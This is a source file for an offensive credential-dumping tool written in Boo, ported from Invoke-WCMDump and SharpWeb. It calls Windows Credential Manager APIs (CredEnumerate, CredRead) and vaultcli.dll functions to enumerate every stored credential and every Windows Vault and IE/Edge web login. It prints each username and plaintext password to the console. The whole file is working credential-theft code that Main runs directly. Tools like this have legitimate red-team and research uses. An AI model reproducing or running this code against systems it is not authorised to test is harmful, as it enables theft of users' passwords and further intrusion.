/*
Ported from:
    - Invoke-WCMDump (https://github.com/peewpw/Invoke-WCMDump)
    - Sharpweb (https://github.com/djhohnstein/SharpWeb)
*/
import System
import System.Collections.Generic
import System.Text
import System.Reflection
import System.Reflection.Emit
import System.IO
import System.Runtime.InteropServices
import System.Security
import System.Security.Permissions
import Microsoft.Win32.SafeHandles


public class NativeMethods:
    [DllImport("Advapi32.dll", EntryPoint: "CredReadW", CharSet: CharSet.Unicode, SetLastError: true)]
    internal static def CredRead(target as string, type as CredentialType, reservedFlag as int, ref credentialPtr as IntPtr) as bool:
        pass

    [DllImport("Advapi32.dll", EntryPoint: "CredFree", SetLastError: true)]
    internal static  def CredFree([In] cred as IntPtr):
        pass

    [DllImport("Advapi32.dll", EntryPoint: "CredEnumerate", SetLastError: true, CharSet: CharSet.Unicode)]
    public static def CredEnumerate(filter as string, flag as int, ref count as int, ref pCredentials as IntPtr) as bool:
        pass

    [StructLayout(LayoutKind.Sequential)]
    internal struct CREDENTIAL:
        public Flags as int
        public Type as int
        [MarshalAs(UnmanagedType.LPWStr)] public TargetName as string
        [MarshalAs(UnmanagedType.LPWStr)] public Comment as string
        public LastWritten as long
        public CredentialBlobSize as int
        public CredentialBlob as IntPtr
        public Persist as int
        public AttributeCount as int
        public Attributes as IntPtr
        [MarshalAs(UnmanagedType.LPWStr)] public TargetAlias as string
        [MarshalAs(UnmanagedType.LPWStr)] public UserName as string

    internal static def CredEnumerate() as IEnumerable[of CREDENTIAL]:
        count as int
        pCredentials as IntPtr
        ret as bool = CredEnumerate(null, 0, count, pCredentials)
        if ret == false:
            raise Exception("Failed to enumerate credentials")
        credlist as List[of CREDENTIAL]= List[of CREDENTIAL]()
        credential as IntPtr = IntPtr()

        n as int = 0
        while n < count:
            credential = Marshal.ReadIntPtr(pCredentials, n * Marshal.SizeOf(typeof(IntPtr)))
            credlist.Add(Marshal.PtrToStructure(credential, typeof(CREDENTIAL)) cast CREDENTIAL)
            n++

        return credlist

    internal class CriticalCredentialHandle(CriticalHandleZeroOrMinusOneIsInvalid):
        internal def constructor(preexistingHandle as IntPtr):
            SetHandle(preexistingHandle)

        internal def GetCredential() as CREDENTIAL:
            if not IsInvalid:
                return Marshal.PtrToStructure(handle, typeof(CREDENTIAL)) cast CREDENTIAL

            raise InvalidOperationException("Invalid CriticalHandle!")

        protected override def ReleaseHandle() as bool:
            if not IsInvalid:
                CredFree(handle)
                SetHandleAsInvalid()
                return true
            return false

public enum CredentialType:
    None = 0
    Generic = 1
    DomainPassword = 2
    DomainCertificate = 3
    DomainVisiblePassword = 4
    GenericCertificate = 5
    DomainExtended = 6
    Maximum = 7
    CredTypeMaximum = 7 + 1000

public enum PersistenceType:
    Session = 1
    LocalComputer = 2
    Enterprise = 3

public class Credential(IDisposable):

    private static LockObject as object = object()
    private static UnmanagedCodePermission as SecurityPermission = SecurityPermission(SecurityPermissionFlag.UnmanagedCode)
    private description as string
    private lastWriteTime as DateTime
    private password as string
    private persistenceType as PersistenceType
    private target as string
    private type as CredentialType
    private username as string

    #static def Credential():
    #    lock LockObject:
    #       UnmanagedCodePermission = SecurityPermission(SecurityPermissionFlag.UnmanagedCode)
    #

    def constructor(username as string, password as string, target as string, type as CredentialType):
        Username = username
        Password = password
        Target = target
        Type = type
        PersistenceType = PersistenceType.Session
        lastWriteTime = DateTime.MinValue

    public Username as string:
        get:
            return username
        set:
            username = value

    public Password as string:
        get:
            return password
        set:
            password = value

    public Target as string:
        get:
            return target
        set:
            target = value

    public Description as string:
        get:
            return description
        set:
            description = value

    public LastWriteTime as DateTime:
        get:
            return LastWriteTimeUtc.ToLocalTime()

    public LastWriteTimeUtc as DateTime:
        get:
            return lastWriteTime
        set:
            lastWriteTime = value

    public Type as CredentialType:
        get:
            return type
        set:
            type = value

    public PersistenceType as PersistenceType:
        get:
            return persistenceType
        set:
            persistenceType = value

    public def Dispose():
        pass

    public def Load() as bool:
        UnmanagedCodePermission.Demand()
        credPointer as IntPtr
        result as bool = NativeMethods.CredRead(Target, Type, 0, credPointer)
        if not result:
            return false
        using credentialHandle = NativeMethods.CriticalCredentialHandle(credPointer):
            LoadInternal(credentialHandle.GetCredential())
        return true

    public static def GetAll():
        UnmanagedCodePermission.Demand()

        creds as IEnumerable[of NativeMethods.CREDENTIAL] = NativeMethods.CredEnumerate()
        #credlist as List[of Credential]  = List[of Credential]()

        print "=== Generic Credentials ===\r\n"
        for cred as NativeMethods.CREDENTIAL in creds:
            fullCred as Credential = Credential(cred.UserName, null, cred.TargetName, cred.Type cast CredentialType)
            if fullCred.Load():
                #credlist.Add(fullCred)
                print "Target: $(fullCred.Target)"
                print "    Username        : $(fullCred.Username)"
                print "    Password        : $(fullCred.Password)"
                print "    Description     : $(fullCred.Description)"
                print "    LastWriteTime   : $(fullCred.LastWriteTime)"
                print "    LastWriteTimeUtc: $(fullCred.LastWriteTimeUtc)"
                print "    Type            : $(fullCred.Type)"
                print "    PersistenceType : $(fullCred.PersistenceType)"
                print

    internal def LoadInternal(credential as NativeMethods.CREDENTIAL):
        Username = credential.UserName
        if credential.CredentialBlobSize > 0:
            Password = Marshal.PtrToStringUni(credential.CredentialBlob, credential.CredentialBlobSize / 2)

        Target = credential.TargetName
        Type = credential.Type cast CredentialType
        PersistenceType = credential.Persist cast PersistenceType
        Description = credential.Comment
        LastWriteTimeUtc = DateTime.FromFileTimeUtc(credential.LastWritten)

/*
 * Author: Dwight Hohnstein (@djhohnstein)
 *
 * This is a C# implementation of Get-VaultCredential
 * from @mattifestation, whose PowerShell source is here:
 * https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1
 */


// Thanks to @tifkin and @harmj0y for pointing out that
// Reflection is unecessary for defining these.
public static class VaultCli:
    public enum VAULT_ELEMENT_TYPE:
        Undefined = -1
        Boolean = 0
        Short = 1
        UnsignedShort = 2
        Int = 3
        UnsignedInt = 4
        Double = 5
        Guid = 6
        String = 7
        ByteArray = 8
        TimeStamp = 9
        ProtectedArray = 10
        Attribute = 11
        Sid = 12
        Last = 13

    public enum VAULT_SCHEMA_ELEMENT_ID:
        Illegal = 0
        Resource = 1
        Identity = 2
        Authenticator = 3
        Tag = 4
        PackageSid = 5
        AppStart = 100
        AppEnd = 10000

    [StructLayout(LayoutKind.Sequential, CharSet: CharSet.Ansi)]
    public struct VAULT_ITEM_WIN8:
        public SchemaId as Guid
        public pszCredentialFriendlyName as IntPtr
        public pResourceElement as IntPtr
        public pIdentityElement as IntPtr
        public pAuthenticatorElement as IntPtr
        public pPackageSid as IntPtr
        public LastModified as UInt64
        public dwFlags as UInt32
        public dwPropertiesCount as UInt32
        public pPropertyElements as IntPtr

    [StructLayout(LayoutKind.Sequential, CharSet: CharSet.Ansi)]
    public struct VAULT_ITEM_WIN7:
        public SchemaId as Guid
        public pszCredentialFriendlyName as IntPtr
        public pResourceElement as IntPtr
        public pIdentityElement as IntPtr
        public pAuthenticatorElement as IntPtr
        public LastModified as UInt64
        public dwFlags as UInt32
        public dwPropertiesCount as UInt32
        public pPropertyElements as IntPtr

    [StructLayout(LayoutKind.Explicit, CharSet: CharSet.Ansi)]
    public struct VAULT_ITEM_ELEMENT:
        [FieldOffset(0)] public  SchemaElementId as VAULT_SCHEMA_ELEMENT_ID
        [FieldOffset(8)] public  Type as VAULT_ELEMENT_TYPE

    [DllImport("vaultcli.dll")]
    public static def VaultOpenVault(ref vaultGuid as Guid, offset as UInt32, ref vaultHandle as IntPtr) as Int32:
        pass

    [DllImport("vaultcli.dll")]
    public static def VaultCloseVault(ref vaultHandle as IntPtr) as Int32:
        pass

    [DllImport("vaultcli.dll")]
    public static def VaultFree(ref vaultHandle as IntPtr) as Int32:
        pass

    [DllImport("vaultcli.dll")]
    public static def VaultEnumerateVaults(offset as Int32, ref vaultCount as Int32, ref vaultGuid as IntPtr) as Int32:
        pass

    [DllImport("vaultcli.dll")]
    public static def VaultEnumerateItems(vaultHandle as IntPtr, chunkSize as Int32, ref vaultItemCount as Int32, ref vaultItem as IntPtr) as Int32:
        pass

    [DllImport("vaultcli.dll", EntryPoint: "VaultGetItem")]
    public static def VaultGetItem_WIN8(vaultHandle as IntPtr, ref schemaId as Guid, pResourceElement as IntPtr, pIdentityElement as IntPtr, pPackageSid as IntPtr, zero as IntPtr, arg6 as Int32, ref passwordVaultPtr as IntPtr) as Int32:
        pass

    [DllImport("vaultcli.dll", EntryPoint: "VaultGetItem")]
    public static def VaultGetItem_WIN7(vaultHandle as IntPtr, ref schemaId as Guid, pResourceElement as IntPtr, pIdentityElement as IntPtr, zero as IntPtr, arg5 as Int32, ref passwordVaultPtr as IntPtr) as Int32:
        pass

public class Vault:
    public static def GetLogins():
        print "=== Checking Windows Vaults ===\r\n"
        OSVersion = Environment.OSVersion.Version
        OSMajor = OSVersion.Major
        OSMinor = OSVersion.Minor

        VAULT_ITEM as Type

        if OSMajor >= 6 and OSMinor >= 2:
            VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8)
        else:
            VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7)

        /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */
        def GetVaultElementValue(vaultElementPtr as IntPtr) as object:
            results as object
            partialElement  as object = Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT))
            partialElementInfo as FieldInfo = partialElement.GetType().GetField("Type")
            partialElementType = partialElementInfo.GetValue(partialElement)

            elementPtr as IntPtr = (vaultElementPtr.ToInt64() + 16) cast IntPtr
            results = null
            __switch__(partialElementType cast int, case7, case0, case1, case2, case3, case4, case5, case6, case12)
            :case7 // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
            StringPtr as IntPtr = Marshal.ReadIntPtr(elementPtr)
            results = Marshal.PtrToStringUni(StringPtr)
            :case0 // VAULT_ELEMENT_TYPE == bool
            results = Marshal.ReadByte(elementPtr)
            results = results cast bool
            :case1 // VAULT_ELEMENT_TYPE == Short
            results = Marshal.ReadInt16(elementPtr)
            :case2 // VAULT_ELEMENT_TYPE == Unsigned Short
            results = Marshal.ReadInt16(elementPtr)
            :case3 // VAULT_ELEMENT_TYPE == Int
            results = Marshal.ReadInt32(elementPtr)
            :case4 // VAULT_ELEMENT_TYPE == Unsigned Int
            results = Marshal.ReadInt32(elementPtr)
            :case5 // VAULT_ELEMENT_TYPE == Double
            results = Marshal.PtrToStructure(elementPtr, typeof(Double))
            :case6 // VAULT_ELEMENT_TYPE == GUID
            results = Marshal.PtrToStructure(elementPtr, typeof(Guid))
            :case12 // VAULT_ELEMENT_TYPE == Sid
            sidPtr as IntPtr = Marshal.ReadIntPtr(elementPtr)
            sidObject = Principal.SecurityIdentifier(sidPtr)
            results = sidObject.Value

            return results

        /* End helper function */

        vaultCount as Int32 = 0
        vaultGuidPtr as IntPtr = IntPtr.Zero
        result = VaultCli.VaultEnumerateVaults(0, vaultCount, vaultGuidPtr)

        if result cast int != 0:
            raise Exception("[ERROR] Unable to enumerate vaults. Error (0x$(result.ToString()))")

        // Create dictionary to translate Guids to human readable elements
        guidAddress as IntPtr = vaultGuidPtr
        vaultSchema as Dictionary[of Guid, string] = Dictionary[of Guid, string]()
        vaultSchema.Add(Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note")
        vaultSchema.Add(Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential")
        vaultSchema.Add(Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector")
        vaultSchema.Add(Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials")
        vaultSchema.Add(Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials")
        vaultSchema.Add(Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential")
        vaultSchema.Add(Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential")
        vaultSchema.Add(Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential")
        vaultSchema.Add(Guid("00000000-0000-0000-0000-000000000000"), null)

        i as int = 0
        while i < vaultCount:
            // Open vault block
            vaultGuidString  as object = Marshal.PtrToStructure(guidAddress, typeof(Guid))
            vaultGuid as Guid = Guid(vaultGuidString.ToString())
            guidAddress = (guidAddress.ToInt64() + Marshal.SizeOf(typeof(Guid))) cast IntPtr
            vaultHandle as IntPtr = IntPtr.Zero
            vaultType as string
            if vaultSchema.ContainsKey(vaultGuid):
                vaultType = vaultSchema[vaultGuid]
            else:
                vaultType = vaultGuid.ToString()

            result = VaultCli.VaultOpenVault(vaultGuid, 0 cast UInt32, vaultHandle)
            if result != 0:
                raise Exception("Unable to open the following vault: $vaultType. Error: 0x$(result.ToString())")

            // Vault opened successfully! Continue.

            print "\r\n  Vault GUID     : $vaultGuid"
            print "  Vault Type     : $vaultType\r\n"

            // Fetch all items within Vault
            vaultItemCount as int = 0
            vaultItemPtr as IntPtr = IntPtr.Zero
            result = VaultCli.VaultEnumerateItems(vaultHandle, 512, vaultItemCount, vaultItemPtr)
            if result != 0:
                raise Exception("[ERROR] Unable to enumerate vault items from the following vault: $vaultType. Error 0x$(result.ToString())")

            structAddress = vaultItemPtr
            if vaultItemCount > 0:
                // For each vault item...
                j as int = 1
                while  j <= vaultItemCount:
                    // Begin fetching vault item...
                    currentItem = Marshal.PtrToStructure(structAddress, VAULT_ITEM)
                    structAddress = (structAddress.ToInt64() + Marshal.SizeOf(VAULT_ITEM)) cast IntPtr

                    passwordVaultItem as IntPtr = IntPtr.Zero

                    schemaIdInfo as FieldInfo = currentItem.GetType().GetField("SchemaId")
                    schemaId as Guid = Guid(schemaIdInfo.GetValue(currentItem).ToString())
                    pResourceElementInfo as FieldInfo = currentItem.GetType().GetField("pResourceElement")
                    pResourceElement as IntPtr = pResourceElementInfo.GetValue(currentItem) cast IntPtr
                    pIdentityElementInfo as FieldInfo = currentItem.GetType().GetField("pIdentityElement")
                    pIdentityElement as IntPtr= pIdentityElementInfo.GetValue(currentItem) cast IntPtr
                    dateTimeInfo as FieldInfo = currentItem.GetType().GetField("LastModified")
                    lastModified as UInt64= dateTimeInfo.GetValue(currentItem) cast UInt64

                    vaultGetItemArgs as (object)
                    pPackageSid as IntPtr = IntPtr.Zero
                    if OSMajor >= 6 and OSMinor >= 2:
                        // Newer versions have package sid
                        pPackageSidInfo as FieldInfo = currentItem.GetType().GetField("pPackageSid")
                        pPackageSid = pPackageSidInfo.GetValue(currentItem) cast IntPtr
                        result = VaultCli.VaultGetItem_WIN8(vaultHandle, schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, passwordVaultItem)
                    else:
                        result = VaultCli.VaultGetItem_WIN7(vaultHandle, schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, passwordVaultItem)

                    if result != 0:
                        raise Exception("Error occured while retrieving vault item. Error: 0x$(result.ToString())")

                    passwordItem as object = Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM)
                    pAuthenticatorElementInfo as FieldInfo = passwordItem.GetType().GetField("pAuthenticatorElement")
                    pAuthenticatorElement as IntPtr = pAuthenticatorElementInfo.GetValue(passwordItem) cast IntPtr
                    // Fetch the credential from the authenticator element
                    cred as object = GetVaultElementValue(pAuthenticatorElement)
                    packageSid as object = null
                    if pPackageSid != IntPtr.Zero:
                        packageSid = GetVaultElementValue(pPackageSid)

                    if cred != null: // Indicates successful fetch
                        print "--- IE/Edge Credential ---"
                        print "Vault Type   : $vaultType"
                        resource as object = GetVaultElementValue(pResourceElement)
                        if resource != null:
                            print "Resource     : $resource"

                        identity as object = GetVaultElementValue(pIdentityElement)
                        if identity != null:
                            print "Identity     : $identity"

                        if packageSid != null:
                            print "PacakgeSid  : $packageSid"

                        print "Credential   : $cred"

                        // Stupid datetime
                        print "LastModified : $(DateTime.FromFileTimeUtc(lastModified cast long))"
                        print
                    j++
            i++


public static def Main():
    Vault.GetLogins()
    Credential.GetAll()
